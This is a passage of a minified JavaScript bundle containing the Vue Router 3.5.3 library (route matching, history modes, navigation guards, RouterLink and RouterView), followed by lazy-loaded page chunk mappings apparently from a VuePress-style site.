Za={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,r=e.children,a=e.parent,o=e.data;o.routerView=!0;for(var i=a.$createElement,s=t.name,c=a.$route,l=a._routerViewCache||(a._routerViewCache={}),p=0,d=!1;a&&a._routerRoot!==a;){var u=a.$vnode?a.$vnode.data:{};u.routerView&&p++,u.keepAlive&&a._directInactive&&a._inactive&&(d=!0),a=a.$parent}if(o.routerViewDepth=p,d){var m=l[s],g=m&&m.component;return g?(m.configProps&&Qa(g,o,m.route,m.configProps),i(g,o,r)):i()}var f=c.matched[p],b=f&&f.components[s];if(!f||!b)return l[s]=null,i();l[s]={component:b},o.registerRouteInstance=function(n,e){var t=f.instances[s];(e&&t!==n||!e&&t===n)&&(f.instances[s]=e)},(o.hook||(o.hook={})).prepatch=function(n,e){f.instances[s]=e.componentInstance},o.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==f.instances[s]&&(f.instances[s]=n.componentInstance),Xa(c)};var h=f.props&&f.props[s];return h&&(Oa(l[s],{route:c,configProps:h}),Qa(b,o,c,h)),i(b,o,r)}};function Qa(n,e,t,r){var a=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,r);if(a){a=e.props=Oa({},a);var o=e.attrs=e.attrs||{};for(var i in a)n.props&&i in n.props||(o[i]=a[i],delete a[i])}}function no(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var o=n.replace(/^\//,"").split("/"),i=0;i<o.length;i++){var s=o[i];".."===s?a.pop():"."!==s&&a.push(s)}return""!==a[0]&&a.unshift(""),a.join("/")}function eo(n){return n.replace(/\/+/g,"/")}var to=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},ro=vo,ao=lo,oo=function(n,e){return uo(lo(n,e),e)},io=uo,so=ho,co=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function lo(n,e){for(var t,r=[],a=0,o=0,i="",s=e&&e.delimiter||"/";null!=(t=co.exec(n));){var c=t[0],l=t[1],p=t.index;if(i+=n.slice(o,p),o=p+c.length,l)i+=l[1];else{var d=n[o],u=t[2],m=t[3],g=t[4],f=t[5],b=t[6],h=t[7];i&&(r.push(i),i="");var v=null!=u&&null!=d&&d!==u,y="+"===b||"*"===b,k="?"===b||"*"===b,x=t[2]||s,w=g||f;r.push({name:m||a++,prefix:u||"",delimiter:x,optional:k,repeat:y,partial:v,asterisk:!!h,pattern:w?go(w):h?".*":"[^"+mo(x)+"]+?"})}}return o<n.length&&(i+=n.substr(o)),i&&r.push(i),r}function po(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function uo(n,e){for(var t=new Array(n.length),r=0;r<n.length;r++)"object"==typeof n[r]&&(t[r]=new RegExp("^(?:"+n[r].pattern+")$",bo(e)));return function(e,r){for(var a="",o=e||{},i=(r||{}).pretty?po:encodeURIComponent,s=0;s<n.length;s++){var c=n[s];if("string"!=typeof c){var l,p=o[c.name];if(null==p){if(c.optional){c.partial&&(a+=c.prefix);continue}throw new TypeError('Expected "'+c.name+'" to be defined')}if(to(p)){if(!c.repeat)throw new TypeError('Expected "'+c.name+'" to not repeat, but received `'+JSON.stringify(p)+"`");if(0===p.length){if(c.optional)continue;throw new TypeError('Expected "'+c.name+'" to not be empty')}for(var d=0;d<p.length;d++){if(l=i(p[d]),!t[s].test(l))throw new TypeError('Expected all "'+c.name+'" to match "'+c.pattern+'", but received `'+JSON.stringify(l)+"`");a+=(0===d?c.prefix:c.delimiter)+l}}else{if(l=c.asterisk?encodeURI(p).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):i(p),!t[s].test(l))throw new TypeError('Expected "'+c.name+'" to match "'+c.pattern+'", but received "'+l+'"');a+=c.prefix+l}}else a+=c}return a}}function mo(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function go(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function fo(n,e){return n.keys=e,n}function bo(n){return n&&n.sensitive?"":"i"}function ho(n,e,t){to(e)||(t=e||t,e=[]);for(var r=(t=t||{}).strict,a=!1!==t.end,o="",i=0;i<n.length;i++){var s=n[i];if("string"==typeof s)o+=mo(s);else{var c=mo(s.prefix),l="(?:"+s.pattern+")";e.push(s),s.repeat&&(l+="(?:"+c+l+")*"),o+=l=s.optional?s.partial?c+"("+l+")?":"(?:"+c+"("+l+"))?":c+"("+l+")"}}var p=mo(t.delimiter||"/"),d=o.slice(-p.length)===p;return r||(o=(d?o.slice(0,-p.length):o)+"(?:"+p+"(?=$))?"),o+=a?"$":r&&d?"":"(?="+p+"|$)",fo(new RegExp("^"+o,bo(t)),e)}function vo(n,e,t){return to(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var r=0;r<t.length;r++)e.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return fo(n,e)}(n,e):to(n)?function(n,e,t){for(var r=[],a=0;a<n.length;a++)r.push(vo(n[a],e,t).source);return fo(new RegExp("(?:"+r.join("|")+")",bo(t)),e)}(n,e,t):function(n,e,t){return ho(lo(n,t),e,t)}(n,e,t)}ro.parse=ao,ro.compile=oo,ro.tokensToFunction=io,ro.tokensToRegExp=so;var yo=Object.create(null);function ko(n,e,t){e=e||{};try{var r=yo[n]||(yo[n]=ro.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),r(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function xo(n,e,t,r){var a="string"==typeof n?{path:n}:n;if(a._normalized)return a;if(a.name){var o=(a=Oa({},n)).params;return o&&"object"==typeof o&&(a.params=Oa({},o)),a}if(!a.path&&a.params&&e){(a=Oa({},a))._normalized=!0;var i=Oa(Oa({},e.params),a.params);if(e.name)a.name=e.name,a.params=i;else if(e.matched.length){var s=e.matched[e.matched.length-1].path;a.path=ko(s,i,e.path)}else 0;return a}var c=function(n){var e="",t="",r=n.indexOf("#");r>=0&&(e=n.slice(r),n=n.slice(0,r));var a=n.indexOf("?");return a>=0&&(t=n.slice(a+1),n=n.slice(0,a)),{path:n,query:t,hash:e}}(a.path||""),l=e&&e.path||"/",p=c.path?no(c.path,l,t||a.append):l,d=function(n,e,t){void 0===e&&(e={});var r,a=t||$a;try{r=a(n||"")}catch(n){r={}}for(var o in e){var i=e[o];r[o]=Array.isArray(i)?i.map(qa):qa(i)}return r}(c.query,a.query,r&&r.options.parseQuery),u=a.hash||c.hash;return u&&"#"!==u.charAt(0)&&(u="#"+u),{_normalized:!0,path:p,query:d,hash:u}}var wo,So=function(){},jo={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,r=this.$route,a=t.resolve(this.to,r,this.append),o=a.location,i=a.route,s=a.href,c={},l=t.options.linkActiveClass,p=t.options.linkExactActiveClass,d=null==l?"router-link-active":l,u=null==p?"router-link-exact-active":p,m=null==this.activeClass?d:this.activeClass,g=null==this.exactActiveClass?u:this.exactActiveClass,f=i.redirectedFrom?Va(null,xo(i.redirectedFrom),null,t):i;c[g]=Ka(r,f,this.exactPath),c[m]=this.exact||this.exactPath?c[g]:function(n,e){return 0===n.path.replace(Ua,"/").indexOf(e.path.replace(Ua,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(r,f);var b=c[g]?this.ariaCurrentValue:null,h=function(n){Eo(n)&&(e.replace?t.replace(o,So):t.push(o,So))},v={click:Eo};Array.isArray(this.event)?this.event.forEach((function(n){v[n]=h})):v[this.event]=h;var y={class:c},k=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:s,route:i,navigate:h,isActive:c[m],isExactActive:c[g]});if(k){if(1===k.length)return k[0];if(k.length>1||!k.length)return 0===k.length?n():n("span",{},k)}if("a"===this.tag)y.on=v,y.attrs={href:s,"aria-current":b};else{var x=function n(e){var t;if(e)for(var r=0;r<e.length;r++){if("a"===(t=e[r]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(x){x.isStatic=!1;var w=x.data=Oa({},x.data);for(var S in w.on=w.on||{},w.on){var j=w.on[S];S in v&&(w.on[S]=Array.isArray(j)?j:[j])}for(var E in v)E in w.on?w.on[E].push(v[E]):w.on[E]=h;var P=x.data.attrs=Oa({},x.data.attrs);P.href=s,P["aria-current"]=b}else y.on=v}return n(this.tag,y,this.$slots.default)}};function Eo(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var Po="undefined"!=typeof window;function Ao(n,e,t,r,a){var o=e||[],i=t||Object.create(null),s=r||Object.create(null);n.forEach((function(n){!function n(e,t,r,a,o,i){var s=a.path,c=a.name;0;var l=a.pathToRegexpOptions||{},p=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return eo(e.path+"/"+n)}(s,o,l.strict);"boolean"==typeof a.caseSensitive&&(l.sensitive=a.caseSensitive);var d={path:p,regex:To(p,l),components:a.components||{default:a.component},alias:a.alias?"string"==typeof a.alias?[a.alias]:a.alias:[],instances:{},enteredCbs:{},name:c,parent:o,matchAs:i,redirect:a.redirect,beforeEnter:a.beforeEnter,meta:a.meta||{},props:null==a.props?{}:a.components?a.props:{default:a.props}};a.children&&a.children.forEach((function(a){var o=i?eo(i+"/"+a.path):void 0;n(e,t,r,a,d,o)}));t[d.path]||(e.push(d.path),t[d.path]=d);if(void 0!==a.alias)for(var u=Array.isArray(a.alias)?a.alias:[a.alias],m=0;m<u.length;++m){0;var g={path:u[m],children:a.children};n(e,t,r,g,o,d.path||"/")}c&&(r[c]||(r[c]=d))}(o,i,s,n,a)}));for(var c=0,l=o.length;c<l;c++)"*"===o[c]&&(o.push(o.splice(c,1)[0]),l--,c--);return{pathList:o,pathMap:i,nameMap:s}}function To(n,e){return ro(n,[],e)}function Co(n,e){var t=Ao(n),r=t.pathList,a=t.pathMap,o=t.nameMap;function i(n,t,i){var s=xo(n,t,!1,e),l=s.name;if(l){var p=o[l];if(!p)return c(null,s);var d=p.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var u in t.params)!(u in s.params)&&d.indexOf(u)>-1&&(s.params[u]=t.params[u]);return s.path=ko(p.path,s.params),c(p,s,i)}if(s.path){s.params={};for(var m=0;m<r.length;m++){var g=r[m],f=a[g];if(Io(f.regex,s.path,s.params))return c(f,s,i)}}return c(null,s)}function s(n,t){var r=n.redirect,a="function"==typeof r?r(Va(n,t,null,e)):r;if("string"==typeof a&&(a={path:a}),!a||"object"!=typeof a)return c(null,t);var s=a,l=s.name,p=s.path,d=t.query,u=t.hash,m=t.params;if(d=s.hasOwnProperty("query")?s.query:d,u=s.hasOwnProperty("hash")?s.hash:u,m=s.hasOwnProperty("params")?s.params:m,l){o[l];return i({_normalized:!0,name:l,query:d,hash:u,params:m},void 0,t)}if(p){var g=function(n,e){return no(n,e.parent?e.parent.path:"/",!0)}(p,n);return i({_normalized:!0,path:ko(g,m),query:d,hash:u},void 0,t)}return c(null,t)}function c(n,t,r){return n&&n.redirect?s(n,r||t):n&&n.matchAs?function(n,e,t){var r=i({_normalized:!0,path:ko(t,e.params)});if(r){var a=r.matched,o=a[a.length-1];return e.params=r.params,c(o,e)}return c(null,e)}(0,t,n.matchAs):Va(n,t,r,e)}return{match:i,addRoute:function(n,e){var t="object"!=typeof n?o[n]:void 0;Ao([e||n],r,a,o,t),t&&t.alias.length&&Ao(t.alias.map((function(n){return{path:n,children:[e]}})),r,a,o,t)},getRoutes:function(){return r.map((function(n){return a[n]}))},addRoutes:function(n){Ao(n,r,a,o)}}}function Io(n,e,t){var r=e.match(n);if(!r)return!1;if(!t)return!0;for(var a=1,o=r.length;a<o;++a){var i=n.keys[a-1];i&&(t[i.name||"pathMatch"]="string"==typeof r[a]?La(r[a]):r[a])}return!0}var Ro=Po&&window.performance&&window.performance.now?window.performance:Date;function _o(){return Ro.now().toFixed(3)}var Bo=_o();function Oo(){return Bo}function zo(n){return Bo=n}var Do=Object.create(null);function Mo(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=Oa({},window.history.state);return t.key=Oo(),window.history.replaceState(t,"",e),window.addEventListener("popstate",qo),function(){window.removeEventListener("popstate",qo)}}function No(n,e,t,r){if(n.app){var a=n.options.scrollBehavior;a&&n.app.$nextTick((function(){var o=function(){var n=Oo();if(n)return Do[n]}(),i=a.call(n,e,t,r?o:null);i&&("function"==typeof i.then?i.then((function(n){Go(n,o)})).catch((function(n){0})):Go(i,o))}))}}function Lo(){var n=Oo();n&&(Do[n]={x:window.pageXOffset,y:window.pageYOffset})}function qo(n){Lo(),n.state&&n.state.key&&zo(n.state.key)}function $o(n){return Uo(n.x)||Uo(n.y)}function Fo(n){return{x:Uo(n.x)?n.x:window.pageXOffset,y:Uo(n.y)?n.y:window.pageYOffset}}function Uo(n){return"number"==typeof n}var Vo=/^#\d/;function Go(n,e){var t,r="object"==typeof n;if(r&&"string"==typeof n.selector){var a=Vo.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(a){var o=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),r=n.getBoundingClientRect();return{x:r.left-t.left-e.x,y:r.top-t.top-e.y}}(a,o={x:Uo((t=o).x)?t.x:0,y:Uo(t.y)?t.y:0})}else $o(n)&&(e=Fo(n))}else r&&$o(n)&&(e=Fo(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var Ho,Jo=Po&&((-1===(Ho=window.navigator.userAgent).indexOf("Android 2.")&&-1===Ho.indexOf("Android 4.0")||-1===Ho.indexOf("Mobile Safari")||-1!==Ho.indexOf("Chrome")||-1!==Ho.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function Wo(n,e){Lo();var t=window.history;try{if(e){var r=Oa({},t.state);r.key=Oo(),t.replaceState(r,"",n)}else t.pushState({key:zo(_o())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function Ko(n){Wo(n,!0)}function Yo(n,e,t){var r=function(a){a>=n.length?t():n[a]?e(n[a],(function(){r(a+1)})):r(a+1)};r(0)}var Xo={redirected:2,aborted:4,cancelled:8,duplicated:16};function Zo(n,e){return ni(n,e,Xo.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return ei.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function Qo(n,e){return ni(n,e,Xo.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function ni(n,e,t,r){var a=new Error(r);return a._isRouter=!0,a.from=n,a.to=e,a.type=t,a}var ei=["params","query","hash"];function ti(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function ri(n,e){return ti(n)&&n._isRouter&&(null==e||n.type===e)}function ai(n){return function(e,t,r){var a=!1,o=0,i=null;oi(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){a=!0,o++;var c,l=ci((function(e){var a;((a=e).__esModule||si&&"Module"===a[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:wo.extend(e),t.components[s]=e,--o<=0&&r()})),p=ci((function(n){var e="Failed to resolve async component "+s+": "+n;i||(i=ti(n)?n:new Error(e),r(i))}));try{c=n(l,p)}catch(n){p(n)}if(c)if("function"==typeof c.then)c.then(l,p);else{var d=c.component;d&&"function"==typeof d.then&&d.then(l,p)}}})),a||r()}}function oi(n,e){return ii(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function ii(n){return Array.prototype.concat.apply([],n)}var si="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function ci(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var li=function(n,e){this.router=n,this.base=function(n){if(!n)if(Po){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=Ha,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function pi(n,e,t,r){var a=oi(n,(function(n,r,a,o){var i=function(n,e){"function"!=typeof n&&(n=wo.extend(n));return n.options[e]}(n,e);if(i)return Array.isArray(i)?i.map((function(n){return t(n,r,a,o)})):t(i,r,a,o)}));return ii(r?a.reverse():a)}function di(n,e){if(e)return function(){return n.apply(e,arguments)}}li.prototype.listen=function(n){this.cb=n},li.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},li.prototype.onError=function(n){this.errorCbs.push(n)},li.prototype.transitionTo=function(n,e,t){var r,a=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var o=this.current;this.confirmTransition(r,(function(){a.updateRoute(r),e&&e(r),a.ensureURL(),a.router.afterHooks.forEach((function(n){n&&n(r,o)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!a.ready&&(ri(n,Xo.redirected)&&o===Ha||(a.ready=!0,a.readyErrorCbs.forEach((function(e){e(n)}))))}))},li.prototype.confirmTransition=function(n,e,t){var r=this,a=this.current;this.pending=n;var o,i,s=function(n){!ri(n)&&ti(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},c=n.matched.length-1,l=a.matched.length-1;if(Ka(n,a)&&c===l&&n.matched[c]===a.matched[l])return this.ensureURL(),n.hash&&No(this.router,a,n,!1),s(((i=ni(o=a,n,Xo.duplicated,'Avoided redundant navigation to current location: "'+o.fullPath+'".')).name="NavigationDuplicated",i));var p=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),d=p.updated,u=p.deactivated,m=p.activated,g=[].concat(function(n){return pi(n,"beforeRouteLeave",di,!0)}(u),this.router.beforeHooks,function(n){return pi(n,"beforeRouteUpdate",di)}(d),m.map((function(n){return n.beforeEnter})),ai(m)),f=function(e,t){if(r.pending!==n)return s(Qo(a,n));try{e(n,a,(function(e){!1===e?(r.ensureURL(!0),s(function(n,e){return ni(n,e,Xo.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(a,n))):ti(e)?(r.ensureURL(!0),s(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(s(Zo(a,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){s(n)}};Yo(g,f,(function(){Yo(function(n){return pi(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,a,o){return n(r,a,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),o(n)}))}}(n,t,r)}))}(m).concat(r.router.resolveHooks),f,(function(){if(r.pending!==n)return s(Qo(a,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){Xa(n)}))}))}))},li.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},li.prototype.setupListeners=function(){},li.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=Ha,this.pending=null};var ui=function(n){function e(e,t){n.call(this,e,t),this._startLocation=mi(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=Jo&&t;r&&this.listeners.push(Mo());var a=function(){var t=n.current,a=mi(n.base);n.current===Ha&&a===n._startLocation||n.transitionTo(a,(function(n){r&&No(e,n,t,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Wo(eo(r.base+n.fullPath)),No(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Ko(eo(r.base+n.fullPath)),No(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(mi(this.base)!==this.current.fullPath){var e=eo(this.base+this.current.fullPath);n?Wo(e):Ko(e)}},e.prototype.getCurrentLocation=function(){return mi(this.base)},e}(li);function mi(n){var e=window.location.pathname,t=e.toLowerCase(),r=n.toLowerCase();return!n||t!==r&&0!==t.indexOf(eo(r+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var gi=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=mi(n);if(!/^\/#/.test(e))return window.location.replace(eo(n+"/#"+e)),!0}(this.base)||fi()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=Jo&&e;t&&this.listeners.push(Mo());var r=function(){var e=n.current;fi()&&n.transitionTo(bi(),(function(r){t&&No(n.router,r,e,!0),Jo||yi(r.fullPath)}))},a=Jo?"popstate":"hashchange";window.addEventListener(a,r),this.listeners.push((function(){window.removeEventListener(a,r)}))}},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){vi(n.fullPath),No(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){yi(n.fullPath),No(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;bi()!==e&&(n?vi(e):yi(e))},e.prototype.getCurrentLocation=function(){return bi()},e}(li);function fi(){var n=bi();return"/"===n.charAt(0)||(yi("/"+n),!1)}function bi(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function hi(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function vi(n){Jo?Wo(hi(n)):window.location.hash=n}function yi(n){Jo?Ko(hi(n)):window.location.replace(hi(n))}var ki=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){ri(n,Xo.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(li),xi=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Co(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!Jo&&!1!==n.fallback,this.fallback&&(e="hash"),Po||(e="abstract"),this.mode=e,e){case"history":this.history=new ui(this,n.base);break;case"hash":this.history=new gi(this,n.base,this.fallback);break;case"abstract":this.history=new ki(this,n.base);break;default:0}},wi={currentRoute:{configurable:!0}};function Si(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}xi.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},wi.currentRoute.get=function(){return this.history&&this.history.current},xi.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof ui||t instanceof gi){var r=function(n){t.setupListeners(),function(n){var r=t.current,a=e.options.scrollBehavior;Jo&&a&&"fullPath"in n&&No(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},xi.prototype.beforeEach=function(n){return Si(this.beforeHooks,n)},xi.prototype.beforeResolve=function(n){return Si(this.resolveHooks,n)},xi.prototype.afterEach=function(n){return Si(this.afterHooks,n)},xi.prototype.onReady=function(n,e){this.history.onReady(n,e)},xi.prototype.onError=function(n){this.history.onError(n)},xi.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},xi.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},xi.prototype.go=function(n){this.history.go(n)},xi.prototype.back=function(){this.go(-1)},xi.prototype.forward=function(){this.go(1)},xi.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},xi.prototype.resolve=function(n,e,t){var r=xo(n,e=e||this.history.current,t,this),a=this.match(r,e),o=a.redirectedFrom||a.fullPath;return{location:r,route:a,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?eo(n+"/"+r):r}(this.history.base,o,this.mode),normalizedTo:r,resolved:a}},xi.prototype.getRoutes=function(){return this.matcher.getRoutes()},xi.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==Ha&&this.history.transitionTo(this.history.getCurrentLocation())},xi.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==Ha&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(xi.prototype,wi),xi.install=function n(e){if(!n.installed||wo!==e){n.installed=!0,wo=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",Za),e.component("RouterLink",jo);var a=e.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},xi.version="3.5.3",xi.isNavigationFailure=ri,xi.NavigationFailureType=Xo,xi.START_LOCATION=Ha,Po&&window.Vue&&window.Vue.use(xi);var ji=xi;t(182),t(183),t(258),t(46),t(260),t(26),t(27),t(261);function Ei(n){n.locales&&Object.keys(n.locales).forEach((function(e){n.locales[e].path=e})),Object.freeze(n)}t(74),t(97),t(134);function Pi(n){return(Pi="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n})(n)}var Ai=t(76),Ti=(t(192),t(28),t(53),t(232),t(233),t(48),t(30),{NotFound:function(){return Promise.all([t.e(1),t.e(13)]).then(t.bind(null,490))},Layout:function(){return Promise.all([t.e(1),t.e(11)]).then(t.bind(null,489))}}),Ci={"v-4a355d2a":function(){return t.e(14).then(t.bind(null,491))},"v-104240f2":function(){return t.e(15).then(t.bind(null,492))},"v-2acc2292":function(){return t.e(16).then(t.bind(null,493))},"v-5ba1bd3a":function(){return t.e(17).then(t.bind(null,494))},"v-1a1b5d5b":function(){return t.e(18).then(t.bind(null,495))},"v-c385f750":function(){return t.e(20).then(t.bind(null,496))},"v-c10cfd86":function(){return t.e(19).then(t.bind(null,497))},"v-1e178af1":function(){return t.e(21).then(t.bind(null,498))},"v-7c3f2df1":function(){return t.e(23).then(t.bind(null,499))},"v-7b24cf72":function(){return 